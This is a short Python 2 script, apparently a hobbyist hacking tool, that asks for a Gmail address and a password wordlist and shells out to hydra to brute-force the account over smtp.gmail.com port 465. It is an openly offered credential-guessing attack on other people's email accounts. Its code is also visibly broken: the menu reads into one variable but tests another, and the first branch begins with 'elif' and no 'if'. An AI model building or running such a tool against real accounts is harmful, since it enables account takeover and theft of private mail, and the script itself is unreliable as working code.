#!/usr/bin/python
"""
Brute Force Gmail. 
"""
import sys, os, time

# Restart ####################
def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()
##############################

os.system("clear")
print "Deiri"
print "Gmail"
print "BruteFoce"
print "[]xxxxx[]::::::::::::::::::::> 24-07-2017 (7:53)"
print " [*] Author: Deiri  ---  [*] Version 1.0"
print "c=={:::::::::::::::> Brute Force Console"
print " [*] Brute Gmail"
print "(}xxx{):::::::::> good luck"
print
print "              ===|[ Deiri Brute Force ]|==="
print
print " [01] Gmail Brute Force         "

print
print " [00] Exit"
print
bhydra = raw_input("[*] B-Deiri > ")
  
elif bdeiri == '01' or bdeiri == '1':
  print
  print "          +------------------------------+"
  print "          |  Gmail Brute Force |"
  print "          +------------------------------+"
  print
  print
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()
  
elif bdeiri == '00' or bdeiri == '0':
	print "\n[!] Exit the Program..."
	sys.exit()
	
else:
	print "\n[!] ERROR : Wrong Input"
	time.sleep(1)
	restart_program()